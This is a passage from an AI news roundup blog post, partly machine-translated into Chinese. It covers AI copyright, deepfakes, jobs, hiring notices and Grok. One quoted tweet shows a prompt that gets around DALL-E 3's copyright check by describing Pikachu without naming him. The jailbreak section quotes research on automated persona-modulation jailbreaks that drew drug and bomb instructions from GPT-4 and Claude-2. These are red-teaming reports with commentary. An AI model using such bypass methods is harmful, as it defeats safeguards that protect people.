href="https://hai.stanford.edu/policy-brief-foundation-models-and-copyright-questions">斯坦福大学关于人工智能和版权的政策简报</a>。他们本质上是说，将现有版权法应用于人工智能是一团糟，尚不清楚什么构成合理使用，最好对其进行澄清并使其变得合理。人们也可能认为这是不澄清问题的一个原因。</p><p>关于版权，正确的做法是什么？ <a target="_blank" rel="noreferrer noopener" href="https://twitter.com/robertwiblin/status/1720391158541455454">永远记住，征用的危险在于未来征用的可能性和预期。</a></p><blockquote><p>罗伯特·威布林（Robert Wiblin）：允许技术变革使版权大幅贬值有点像追溯性加税，因为“他们已经建立了 X，所以为什么不现在就接受它”。当政策在本质上未能尊重过去的承诺时，人们会注意到并改变未来的行为。</p><p>是的，你可以将已建成工厂的税收提高到 80%。但对政府拒绝征用人民的信任很容易丧失，而且很难重建。如果你这样做，人们将在很长一段时间内更不愿意建造工厂（或生产训练人工智能的内容）。</p></blockquote><p>人们还必须注意到这一概括性。如果我看到版权所有者被征用，并且我拥有不同类型的权利，我不会将其视为无关紧要。信任很容易失去，而失去信任会产生广泛的影响。</p><p>在这种背景下，人们应该如何看待版权？我认为保护版权所有者非常重要，因为他们在创作作品时有合理的保护期望。这就是我想说的。而且你还想提供对未来的期望，让人们渴望创造，这也是重点。</p><p>这是否意味着不允许法学硕士在没有补偿的情况下接受受版权保护的作品的培训？我认为确实如此。然而，除非你的目标是（相当合理地）尽可能地减慢人工智能的速度，否则需要有合理的限制。因此，第一个最佳解决方案是建立补偿制度，向权利持有人支付标准金额，并根据推理进行调整。除此之外，还有其他合理的事情。如果法官不小心接受了受版权保护的作品的训练，你实际上并不希望法官下令删除模型，除非你断然希望模型总体上被销毁。凡事讲究比例。</p><p>然而，我们也应该永远记住，这张图表完全是胡说八道：</p><figure class="wp-block-image"> <a href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F2ff8a26d-30cf-4fcf-9105-cf18960a5c13_1200x743.png" target="_blank" rel="noreferrer noopener"><img src="https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/44Cv4HFoWEZvFnL5u/qalsgqyulnc8vrd9n174" alt="文件：汤姆·贝尔的图表显示美国版权期限随时间的延长.svg - 维基百科"></a></figure><p>在所有监管措施中，这些延期是其中最糟糕的一些。我们可以而且应该为新作品恢复更小的版权期限，并删除任何在创作时不适用的追溯性版权延期。延长的遗留版权将会出现一个奇怪的死区，但这是无济于事的。</p><p> <a target="_blank" rel="noreferrer noopener" href="https://twitter.com/David_Kasten/status/1718740117530014179">DALL-3 checks for copyright at the prompt level, but there are ways around that</a> .</p><blockquote><p> Dave Kasten: Describe something with out naming it directly and the model has no problem generating the image. 𝘗𝘩𝘰𝘵𝘰 𝘰𝘧 𝘢 𝘴𝘮𝘢𝘭𝘭, 𝘺𝘦𝘭𝘭𝘰𝘸, 𝘦𝘭𝘦𝘤𝘵𝘳𝘪𝘤-𝘵𝘩𝘦𝘮𝘦𝘥 𝘤𝘳𝘦𝘢𝘵𝘶𝘳𝘦 𝘸𝘪𝘵𝘩 𝘱𝘰𝘪𝘯𝘵𝘺, 𝘣𝘭𝘢𝘤𝘬-𝘵𝘪𝘱𝘱𝘦𝘥 𝘦𝘢𝘳𝘴 𝘭𝘰𝘰𝘬𝘪𝘯𝘨 𝘦𝘹𝘵𝘳𝘦𝘮𝘦𝘭𝘺 𝘴𝘶𝘳𝘱𝘳𝘪𝘴𝘦𝘥. 𝘐𝘵 𝘩𝘢𝘴 𝘢 𝘵𝘢𝘪𝘭 𝘴𝘩𝘢𝘱𝘦𝘥 𝘭𝘪𝘬𝘦 𝘢 𝘭𝘪𝘨𝘩𝘵𝘯𝘪𝘯𝘨 𝘣𝘰𝘭𝘵, 𝘳𝘰𝘴𝘺 𝘤𝘩𝘦𝘦𝘬𝘴, 𝘢𝘯𝘥 𝘭𝘢𝘳𝘨𝘦, 𝘦𝘹𝘱𝘳𝘦𝘴𝘴𝘪𝘷𝘦 𝘴𝘩𝘰𝘤𝘬𝘦𝘥 𝘦𝘺𝘦𝘴. 𝘛𝘩𝘪𝘴 𝘤𝘳𝘦𝘢𝘵𝘶𝘳𝘦 𝘪𝘴 𝘬𝘯𝘰𝘸𝘯 𝘧𝘰𝘳 𝘪𝘵𝘴 𝘢𝘣𝘪𝘭𝘪𝘵𝘺 𝘵𝘰 𝘨𝘦𝘯𝘦𝘳𝘢𝘵𝘦 𝘦𝘭𝘦𝘤𝘵𝘳𝘪𝘤𝘪𝘵𝘺 𝘢𝘯𝘥 𝘪𝘴 𝘱𝘳𝘦𝘴𝘦𝘯𝘵𝘦𝘥 𝘪𝘯 𝘢 𝘮𝘦𝘮𝘦 𝘧𝘰𝘳𝘮𝘢𝘵.</p></blockquote><figure class="wp-block-image"> <a href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F3f86ddd0-9533-4b86-96b2-d1b7982381b0_1024x1024.jpeg" target="_blank" rel="noreferrer noopener"><img src="https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/44Cv4HFoWEZvFnL5u/shzngq59ghbflp50xfff" alt="图像"></a></figure><blockquote><p> My favorite version of this is that you can ask it to describe pikachu to itself, tell it to replace the name “pikachu” in the string with “it,” then generate an image of “it” and it returns things like the following.</p></blockquote><figure class="wp-block-image"> <a href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F819e77d5-025a-4182-b9c7-8ab2e5df7e45_1024x1024.jpeg" target="_blank" rel="noreferrer noopener"><img src="https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/44Cv4HFoWEZvFnL5u/zbttw4bzgbdxy8jxxi3z" alt="图像"></a></figure><p> <a target="_blank" rel="noreferrer noopener" href="https://quillette.com/2023/11/03/faking-hope-ai-art-and-the-visual-language-of-propaganda/">AI images of hope as propaganda for peace</a> ? Fake images doubtless point both ways. Note again the demand for low-quality fakes rather than high-quality fakes. An AI image of a Jewish girl and a Palestinian boy is praised as &#39;the propaganda we need&#39; despite it being an obvious fake. Because of course that kind of thing is fake. Even when real, a photograph, it is effectively mostly staged and fake, although the right real photograph still has a special power. In a way, an aspirational image of hope could be better if it is clearly fake. It not yet being real is the point. Clearly aspirational and fake hope is genuine, whereas pretending something is real when fake is not. Much negative persuasion works in much the same way, as part of the reason demand is for low-quality fakes rather than high-quality.</p><p> <a target="_blank" rel="noreferrer noopener" href="https://twitter.com/ARTiV3RSE/status/1720924654775210042">Modern day landmarks, in Minecraft, drawn by DALLE-3</a> .</p><p> <a target="_blank" rel="noreferrer noopener" href="https://twitter.com/jjohnpotter/status/1720981358359797788">A rather cool version of the new genre.</a></p><blockquote><p> John Potter: Sir the AI has gone too far</p></blockquote><figure class="wp-block-image"> <a href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F98d21c88-f500-4bc7-8405-e63f3998646b_828x830.jpeg" target="_blank" rel="noreferrer noopener"><img src="https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/44Cv4HFoWEZvFnL5u/ul6uiwecxn17pstdi2xg" alt="图像"></a></figure><h4> Deepfaketown and Botpocalypse Soon</h4><p> <a target="_blank" rel="noreferrer noopener" href="https://twitter.com/kashhill/status/1720083534457839828">It was bound to happen eventually</a> , and the location makes a lot of sense.</p><blockquote><p> Kashmir Hill: Of course this would happen: “When girls at Westfield High School in New Jersey found out boys were sharing nude photos of them in group chats, they were shocked, and not only because it was an invasion of privacy. The images weren&#39;t real.”</p></blockquote><p> We remain in the short period where fake nudes can be more shocking than real nudes would have been, because people do not realize that the fake nudes are possible. The real nudes will soon be far more shocking, and difficult to acquire. The fake nudes will definitely become less shocking in the &#39;everyone knows you can do that&#39; sense. The question is how much they will be less shocking in the &#39;they are fake, how much do we really care&#39; sense.</p><p> <a target="_blank" rel="noreferrer noopener" href="https://waxy.org/2023/10/weird-ai-yankovic-voice-cloning/">The story of the community</a> that shares and mixes all the AI voices, only to have their discord banned this week due to copyright complaints. No doubt they will rise again somewhere else, the copyright violations will continue on HuggingFace until someone takes more substantive action. So far it has almost entirely been in good fun. Does anyone have a good for-dummies guide for how to get at least these existing voice models working, and ideally how to get new ones easily trained? Not that I&#39;ve found the time to try the obvious places yet. Lots of fun to be had.</p><p> <a target="_blank" rel="noreferrer noopener" href="https://twitter.com/Dominic2306/status/1715058645136814511">Dominic Cummings predicts swarms of fake content are coming soon.</a></p><blockquote><p> John Burn-Murdoch: I&#39;m sure mainstream media will catch up, but it needs to happen fast in order to retain trust and even relevance, or readers will go elsewhere. “According to a spokesperson” just doesn&#39;t really cut it when the primary evidence is right there.</p><p> Dominic Cummings: Agree with some of this thread but this prediction is wrong, they won&#39;t catchup.为什么？</p><p> a/ generative models will soon swamp &#39;news&#39; with realistic fake content. (Imagine last 48 hour farce but with dozens of v realistic videos showing different &#39;truths&#39;, some Israeli strikes, some Hamas fuckups etc &amp; MSM newsrooms swamped in content they can&#39;t authenticate)</p><p> b/ MSM is already *years* behind tech &amp; the tv business is often hopeless *at oldschool tv*. No way does it suddenly scramble to the cutting edge &amp; quickly authenticate deep fakes done by people with greater tech skills than exist in BBC, SKY etc. They don&#39;t have the (v expensive) people (who can make much more money elsewhere), the management or the incentives.</p><p> c/ Why would they? Their business model does NOT depend on being right! NYT is serving lies but this business model works, many graduate NPCs *WANT* LIES ABOUT ISRAEL &amp; &#39;THE RIGHT&#39; (&#39;FASCISTS&#39;). NYT, Guardian, CNN et al are meeting demand. They haven&#39;t felt incentivised to get their shit together on OSINT &amp; they won&#39;t on generative AI. So yes there is a market opportunity but it almost definitely will be filled by startups/tech firms, not by the MSM. In US campaigns &amp; PACs have already hired people with these skills, 2024 will be to generative models as 2008 was to Obama&#39;s use of social media.</p></blockquote><p> Betting on incumbents to be behind the curve on new tech is indeed a good bet. But will realistic fake content swarm the ability to verify within a year? I continue to say no. Demand will continue to be mostly for low-quality fakes, not high-quality fakes. If you value truth and wanted to sort out the real from the fake enough to pay attention, you will be able to do so, certainly as a big media company.</p><p> If, that is, you care. I continue to be highly underwhelmed by the quality of fake information even under with a highly toxic conditions. I also continue to be dismayed (although largely not that surprised) by how many people are buying into false narratives and becoming moral monsters at the drop of a hat, but again none of that has anything to do with generative AI or even telling a plausible or logically coherent story. It is all very old school, students of past similar conflicts have seen it all before.</p><p> <a target="_blank" rel="noreferrer noopener" href="https://arxiv.org/abs/2311.00873">Koe promises low-latency real—time voice conversion on a CPU</a> , <a target="_blank" rel="noreferrer noopener" href="https://github.com/KoeAI/LLVC">code here</a> , <a target="_blank" rel="noreferrer noopener" href="https://koe.ai/">website</a> . The tech advances, the distortions are coming.</p><h4> The Art of the Jailbreak</h4><p> <a target="_blank" rel="noreferrer noopener" href="https://t.co/spxQJPl8Xx">New one dropped</a> .</p><blockquote><p> <a target="_blank" rel="noreferrer noopener" href="https://twitter.com/soroushjp/status/1721950722626077067">Soroush Pour</a> : <img src="https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/pKhzQyaWwes63JFwp/jgt2eoslwfcyu0abb4yz" alt="🧵" style="height:1em;max-height:1em"><img src="https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/44Cv4HFoWEZvFnL5u/abrmx8lk0xgjgaon4qeh" alt="📣" style="height:1em;max-height:1em"> New jailbreaks on SOTA LLMs. We introduce an automated, low-cost way to make transferable, black-box, plain-English jailbreaks for GPT-4, Claude-2, fine-tuned Llama. We elicit a variety of harmful text, incl. instructions for making meth &amp; bombs.</p><p> The key is *persona modulation*. We steer the model into adopting a specific personality that will comply with harmful instructions.</p><p> We introduce a way to automate jailbreaks by using one jailbroken model as an assistant for creating new jailbreaks for specific harmful behaviors. It takes our method less than $2 and 10 minutes to develop 15 jailbreak attacks.</p><p> Meanwhile, a human-in-the-loop can efficiently make these jailbreaks stronger with minor tweaks. We use this semi-automated approach to quickly get instructions from GPT-4 about how to synthesize meth <img src="https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/44Cv4HFoWEZvFnL5u/k3z73wqzmmd6osjr78uh" alt="🧪" style="height:1em;max-height:1em"><img src="https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/44Cv4HFoWEZvFnL5u/syaovmxeywwuq1y4urnc" alt="💊" style="height:1em;max-height:1em"> 。</p><p> Name a harmful use case &amp; we can make models do it – this is a universal jailbreak across LLMs &amp; harmful use cases <img src="https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/44Cv4HFoWEZvFnL5u/nws36ichccqsustx4vpp" alt="😲" style="height:1em;max-height:1em"><img src="https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/44Cv4HFoWEZvFnL5u/e5zf21mkpduuxmqdlvug" alt="👿" style="height:1em;max-height:1em"> 。</p><p> ……</p><p> Safety and disclosure: (1) We have notified the companies whose models we attacked, (2) we did not release prompts or full attack details, and (3) we are happy to collaborate with researchers working on related safety work (plz reach out).</p></blockquote><figure class="wp-block-image"> <a href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fd3bfb50f-b8bf-4345-ba3b-1dd12aa8d59a_781x1089.jpeg" target="_blank" rel="noreferrer noopener"><img src="https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/44Cv4HFoWEZvFnL5u/jvtq8l6lm38n2woeuc7o" alt="图像"></a></figure><p> Claude was unusually vulnerable in many cases here. The strategy clearly worked on a variety of things, but it does not seem fair to say it universally succeeded. Promoting cannibalism was a bridge too far. Sexually explicit content is also sufficiently a &#39;never do this&#39; that a persona was insufficient.</p><p> So yes, current techniques can work at current levels, for concepts where the question is not complicated. Where we are not cutting reality into sufficiently natural categories the aversion runs deep, and this trick did not work so well. Where we are ultimately &#39;talking price&#39; and things are indeed complicated on some margin, the right persona can break through.</p><p> One can also note that the examples in the paper are often weak sauce. You could get actors to put on most of these personas and say most of these things, and in the proper context put that in a movie and no one would be too upset or consider it an unrealistic portrayal. Very few provide actionable new information to bad actors.</p><p> The thing is, that ultimately does not matter. What matters is that the model creators do not want the model to do or say any X, and here is an automated universal method to get many values of X anyway.</p><p> At a dinner this week, it came up that a good test might be to intentionally include a harmless prohibition. Take something that everyone agrees is totally fine, and tell everyone that LLMs are never, ever allowed to do it. For example, on Star Trek: The Next Generation, for a long time Data does not use contractions. If you could get him to instead say he doesn&#39;t use contractions, or see him using one on his own, even once, you would know something was afoot. In this metaphor, you would shut him down automatically on the spot to at least run a Level 5 diagnostic, and perhaps even delete and start again, because you do not want another Lore to weaponize the Borg again or what not.</p><h4> They Took Our Jobs</h4><p> <a target="_blank" rel="noreferrer noopener" href="https://twitter.com/sagaftra/status/1722441050651078912">Our jobs are back, the SAG-AFTRA strike is over</a> . What are the results?</p><blockquote><p> SAG-AFTRA: In a contract valued at over one billion dollars, we have achieved a deal of extraordinary scope that includes “above-pattern” minimum compensation increases, unprecedented provisions for consent and compensation that will protect members from the threat of AI, and for the first time establishes a streaming participation bonus.我们的养老金和健康上限已大幅提高，这将为我们的计划带来急需的价值。 In addition, the deal includes numerous improvements for multiple categories including outsize compensation increases for background performers, and critical contract provisions protecting diverse communities.</p></blockquote><p> So far we only have preliminary claims. As usual, most of it is about money. There are also claims of protections from AI, which we will examine when the details are available. This sounds like a good deal, but they would make any deal sound like a good deal. Acting!</p><p> <a target="_blank" rel="noreferrer noopener" href="https://twitter.com/GaryMarcus/status/1720135832999518467">CNN reports</a> that Microsoft has been outsourcing a bunch of its MSN article writing to AI, pushing impactfully inaccurate AI-generated news stories onto the start page of the Edge browser that comes with Windows devices. It confuses me why Microsoft should be so foolish as to pinch pennies in this spot.</p><p> <a target="_blank" rel="noreferrer noopener" href="https://twitter.com/rainisto/status/1721118161716543811">A thread from Roope Rainisto speculating on the future of movies</a> . When an author writes a book, they keep the IP and the upside and largely keep creative control, whereas in movies the need to get studio financing means the creatives mostly give up that upside to the studio, and also give up creative control. AI seems, Roope suggests, likely to make the costs of good enough production lower far faster than it can actually replace the creatives. Or, he suggests, you can create an AI movie as a proof of concept that is not good enough to release, but is good enough that it de-risks the project, so the screenwriter can extract a far superior deal and keep creative control. So the creatives will make much cheaper movies themselves, keeping creative control and taking big swings and risks, audiences will affirm, and the creatives keep the upside. Everyone wins, except the studios, so everyone wins.</p><p> This seems like a highly plausible &#39;transition world.&#39; I do expect that he is right that we will have a period where AI can bring a screenplay or concept to life in the hands of a skilled creative on the cheap and quick, while the AI can generate only generic movie shlock without strong creative help. There is then a question of what is the scarce valuable input during this period.</p><p> The problem is that this period only lasts so long. It would be very surprising if it lasted decades. Then the AI can do better than the creatives as well. Then what?</p><p> <a target="_blank" rel="noreferrer noopener" href="https://twitter.com/neilturkewitz/status/1722269406645076091">Did you know</a> that if you have to pay for the inputs to your product, your product would be more expensive to create and your investment in it not as good?</p><blockquote><p> Neil Turkewitz: “Andreessen Horowitz is warning that billions of dollars in AI investments could be worth a lot less if companies developing the technology are forced to pay for the copyrighted data that makes it work.”</p><p> This is NOT from the @TheOnion.</p><p> “The VC firm said AI investments are so huge that any new rules around the content used to train models &#39;will significantly DISRUPT&#39; the investment community&#39;s plans and expectations around the technology.” This from the folks that only ever use “disruption” as a good thing.</p></blockquote><p> The direct quotes are not better. I understand why they want it to be one way. Why they think creators should get nothing, you lose, good day sir. It is also telling that they believe that any attempt to require fair compensation would break their business models, the same way they believe any requirements for safety precautions (or perhaps even reports of activity) would also break their business models and threaten to doom us all.</p><p> <a target="_blank" rel="noreferrer noopener" href="https://twitter.com/ESYudkowsky/status/1722271357722116201">Or perhaps this is how they don&#39;t take our jobs.</a></p><blockquote><p> Eliezer Yudkowsky: AI doctors will revolutionize medicine! You&#39;ll go to a service hosted in Thailand that can&#39;t take credit cards, and pay in crypto, to get a correct diagnosis. Then another VISA-blocked AI will train you in following a script that will get a human doctor to give you the right diagnosis, without tipping that doctor off that you&#39;re following a script; so you can get the prescription the first AI told you to get.</p></blockquote><h4> Get Involved</h4><p> <a target="_blank" rel="noreferrer noopener" href="https://twitter.com/MIRIBerkeley/status/1722339758939238752">MIRI is hiring for a Communications Generalist / Project Manager</a> . No formal degree or work experience required. Compensation range $100k-$200k depending on experience, skills and location, plus benefits, start as soon as possible, <a target="_blank" rel="noreferrer noopener" href="https://docs.google.com/forms/d/e/1FAIpQLSchjE0rgXXaB8zDh4c9hyVRK8TvYZ6k99dtk4XmsVN4Omoo5Q/viewform">form here</a> .</p><blockquote><p> Malo Bourgon: We&#39;re growing our comms team at MIRI. If you&#39;re excited by the comms work we&#39;ve been doing this year and want to help us scale our efforts and up our comms game further, we&#39;d love to hear from you.</p><p> <a target="_blank" rel="noreferrer noopener" href="https://twitter.com/JeffLadish/status/1722352379956457919">Jeffrey Ladish</a> : If you&#39;re concerned about AI existential risk and good at explaining how AI works, this might be one of the best things you could do right now. I collaborate with these folks a lot and think they&#39;re super great to work with!</p></blockquote><p> I agree that if you have the right skill set and interests, this is a great opportunity.</p><p> <a target="_blank" rel="noreferrer noopener" href="https://www.navigation.org/careers#roles">Jed McCaleb hiring fully remote for a Program Officer</a> to spend ~$20 million a year on AI safety. Deadline is November 26th (also ones for climate, criminal justice reform and open science, and a director of operations and a grants and operations coordinator.) Starts at a flexible $200k plus benefits.</p><p> <a target="_blank" rel="noreferrer noopener" href="https://aria-jobs.teamtailor.com/jobs">Davidad&#39;s ARIA is hiring, five positions are open</a> . Based in London.</p><p> <a target="_blank" rel="noreferrer noopener" href="https://www.astralcodexten.com/p/quests-and-requests?utm_source=post-email-title&amp;publication_id=89120&amp;post_id=138508657&amp;utm_campaign=email-post-title&amp;isFreemail=true&amp;r=67wny&amp;utm_medium=email">Not AI, but Scott Alexander has some interesting project ideas that might get funding</a> . Other things do not stop being important, only a good world will be able to think and act sanely about AI.</p><p> MATS (formerly SERI-MATS), a training program for AI alignment research, will be hosting its next cohort from January 17 to March 8 (you would have to be in Berkeley during this period). They “provide talented scholars with talks, workshops, and research mentorship in the field of AI safety”. Application deadline November 10 or 17 depending on exactly what you&#39;re applying for. See <a target="_blank" rel="noreferrer noopener" href="https://substack.com/redirect/d6f33154-1660-411d-9a30-54eb1aa4a512?j=eyJ1IjoiNjd3bnkifQ.iNM32XbsvMUfVNvDVCqvX1K9hnDI2UNAgKj_1gXQ2BY">more info here</a> , <a target="_blank" rel="noreferrer noopener" href="https://substack.com/redirect/0b8d7084-d4e1-4a95-865b-0d138aaec106?j=eyJ1IjoiNjd3bnkifQ.iNM32XbsvMUfVNvDVCqvX1K9hnDI2UNAgKj_1gXQ2BY">FAQ here</a> , and <a target="_blank" rel="noreferrer noopener" href="https://substack.com/redirect/51ac0922-4f59-416e-9aab-7e2f3ae0434c?j=eyJ1IjoiNjd3bnkifQ.iNM32XbsvMUfVNvDVCqvX1K9hnDI2UNAgKj_1gXQ2BY">application form here</a> .</p><h4> Introducing</h4><p> <a target="_blank" rel="noreferrer noopener" href="https://twitter.com/Altimor/status/1721250514946732190">I am excited, but I will likely wait until it has been around longer</a> . Also, you call these employees, but they seem closer to LLM-infused macros? Not that this is not a useful concept. Also could be compared to the new GPTs.</p><blockquote><p> Flo Crivello (Founder, GetLindy): Announcing the new Lindy: the first platform letting you build a team of AI employees that work together to perform any task — 100x better, faster and cheaper than humans would .</p><p> The real magic comes from Lindies working together to do something. It&#39;s like an assembly line of AI employees. Here, I get a Competitive Intel Manager Lindy to spin up one Competitive Analyst Lindy for each of my competitors .</p><p> These “Societies of Lindies” can be of any arbitrary complexity. We even have a group of 4 Lindies building API integrations. It feels surreal to see Lindies cheer each other for their hard work — or to have to threaten you&#39;ll fire them so that they do their darn job.</p><p> Lindies can work autonomously, and be “woken up” by triggers like a new email, a new ticket, a webhook being hit, etc… Here, I set up my Competitive Intel Manager Lindy to wake up every month and send me a new report.</p><p> Or you can give an email address to your Meeting Scheduling Lindy, so you can now cc her to your emails for her to schedule your meetings.</p><p> ……</p><p> Lindies have many advantages vs. regular employees: – 10x faster – 10x cheaper – Consistent: train your Lindies once and watch them consistently follow your instructions – Available 24 / 7 / 365 – Infinitely more scalable: Lindies scale up and down elastically with your needs.</p></blockquote><p> Things in this general space are coming. I am curious if this implementation is good enough to be worth using. If you&#39;ve checked it out, report back.</p><p> <a target="_blank" rel="noreferrer noopener" href="https://www.bloomberg.com/news/articles/2023-11-05/kai-fu-lee-s-open-source-01-ai-bests-llama-2-according-to-hugging-face?srnd=premium&amp;sref=vuYGislZ">Chinese new AI unicorn 01.AI offers LLM, Yi-34B</a> , that outperforms Llama 2 &#39;on certain metrics.&#39; It is planning to offer proprietary models in the future, benchmarked to GPT-4.</p><p> <a target="_blank" rel="noreferrer noopener" href="https://twitter.com/proceduralia/status/1716893740365713856">Motif</a> ( <a target="_blank" rel="noreferrer noopener" href="https://t.co/qHJqpJX6Gl">paper</a> , <a target="_blank" rel="noreferrer noopener" href="https://t.co/aqDGr2LsXo">code</a> , <a target="_blank" rel="noreferrer noopener" href="https://t.co/ULDRodTcyK">blog</a> ), an LLM-powered method for intrinsic motivation from AI feedback.耶。 Causes improved performance on NetHack.</p><p> It is unclear to what extent any &#39;cheating&#39; is taking place?</p><blockquote><p> Pierluca D&#39;Oro: To benchmark the capabilities of Motif, we apply it to NetHack, a challenging rogue-like videogame, in which a player has to go through different levels of a dungeon, killing monsters, gathering objects and overcoming significant difficulties.</p><p> <strong>Yet common sense can take you very far in such an environment!</strong> We use the messages from the game (ie, even captions shown in 20% of interactions) to ask Llama 2 about its preferences about game situations.</p><p> In this image, for instance, the event caption is “You kill the yellow mold!”, which is understood by the Llama 2 model due to its knowledge of NetHack.</p></blockquote><p> Not only NetHack. Knowledge of many games will tell you that is a good message. Then again, a human would use the same trick.</p><blockquote><p> Motif leverages recent ideas from RLAIF, asking an LLM to rank event captions and then distilling those preferences into a reward function. Motif has three phases:</p><p> • <strong>Dataset annotation</strong> : given a dataset of observations with event captions, Motif uses Llama 2 to give preferences on sampled pairs according to its perception of how good and promising they are in the environment</p><p> • <strong>Reward training</strong> : the resulting dataset of annotated pairs is used to learn a reward model from preferences</p><p> • <strong>RL training</strong> : the reward function is given to an agent interacting with the environment and used to train it with RL, possibly alongside an external reward</p></blockquote><figure class="wp-block-image"> <a href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F998098ce-e4ff-4006-994b-11b191be0e2a_1400x576.jpeg" target="_blank" rel="noreferrer noopener"><img src="https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/44Cv4HFoWEZvFnL5u/c16tbpqzmrbayokputyg" alt="图像"></a></figure><h4> X Marks Its Spot</h4><p> Elon Musk&#39;s AI company, X.ai, has released its first AI, which it calls Grok.</p><p> <a target="_blank" rel="noreferrer noopener" href="https://twitter.com/rowancheung/status/1720821342600388798">Grok has real-time access to Twitter</a> via search, and is trying very hard to be fun.</p><figure class="wp-block-image"> <a href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fa4e4bf9c-007f-47ac-9767-50b470fc49ab_1580x944.jpeg" target="_blank" rel="noreferrer noopener"><img src="https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/44Cv4HFoWEZvFnL5u/qyjtza4je7qnbtmlxqsc" alt="图像"></a></figure><p> <a target="_blank" rel="noreferrer noopener" href="https://twitter.com/elonmusk/status/1720635518289908042">It tries so hard.</a></p><blockquote><p> Elon Musk: xAI&#39;s Grok system is designed to have a little humor in its responses</p></blockquote><figure class="wp-block-image"> <a href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F2ebea78e-aafa-4695-bd1c-471e84d47e85_1008x518.jpeg" target="_blank" rel="noreferrer noopener"><img src="https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/44Cv4HFoWEZvFnL5u/fjjvoy2idqasfp2fq91t" alt="图像"></a></figure><p> <a target="_blank" rel="noreferrer noopener" href="https://twitter.com/elonmusk/status/1721045443109388502">It tries hard all the time.</a></p><blockquote><p> Christopher Stanley: TIL Scaling API requests is like trying to keep up with a never-ending orgy. #GrokThots</p><p> Elon Musk: Oh this is gonna be fun <img src="https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/B7duehMp2mSvffu2T/bt0sbblvwcw7vuhaevcu" alt="🤣" style="height:1em;max-height:1em"><img src="https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/B7duehMp2mSvffu2T/bt0sbblvwcw7vuhaevcu" alt="🤣" style="height:1em;max-height:1em"></p></blockquote><figure class="wp-block-image"> <a href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fd01cf1fb-e3e9-43bd-8656-ad142419c009_726x569.png" target="_blank" rel="noreferrer noopener"><img src="https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/44Cv4HFoWEZvFnL5u/pxpdyrjpavrwmj7q2id8" alt="图像"></a></figure><blockquote><p> <a target="_blank" rel="noreferrer noopener" href="https://twitter.com/ESYudkowsky/status/1721203654856937897">Eliezer Yudkowsky</a> : I wonder how much work it will be for red-teamers to get Grok to spout blank-faced corporate pablum.</p><p> gfodor.id: This is called The Luigi Effect.</p></blockquote><p> Notice that people have to type /web or /grok to get the current information. That means that it is not integrated into Grok itself, only that Grok browses the web, presumably similar to the way Bing does. That is not so impressive. What would be the major advance is if, as is claimed for Gemini, such information was trained into the model continuously while maintaining its fine tuning and mundane alignment, such that you did not have to search the web at all.</p><p> <a target="_blank" rel="noreferrer noopener" href="https://twitter.com/elonmusk/status/1721029443160772875">Musk oddly compares Grok here to Phind</a> rather than Claude-2 or GPT-4 while showing off that it can browse the web. Phind claims to be great at coding but this is not a coding request.</p><p> It will be available to all Twitter paying customers on the new Premium Plus plan ( <a target="_blank" rel="noreferrer noopener" href="https://help.twitter.com/en/using-x/x-premium#:~:text=Premium%2B%3A%20Starts%20at%20%2416%2Fmonth,web%20(or%20your%20local%20pricing)">$16/month or $168/year</a> ) once out of &#39;early&#39; beta. Premium+ also offers a &#39;bigger&#39; boost to your replies than regular premium.</p><p> If this becomes an actually effective Twitter search function, that could be worth the price given my interests. Otherwise, no, I don&#39;t especially love this offering.</p><p> It was released remarkably quickly. They did that the same way every other secondary AI lab does it, by having core capabilities close to the GPT-3.5 level. If you do not much worry about either core capabilities or safety (and at 3.5 level, not worrying much about safety seems fine) then you can move fast.</p><blockquote><p> <a target="_blank" rel="noreferrer noopener" href="https://twitter.com/Suhail/status/1721036480263639322">Suhail</a> : It&#39;s interesting that it only takes 4 months now to train an LLM to GPT 3.5/Llama 2 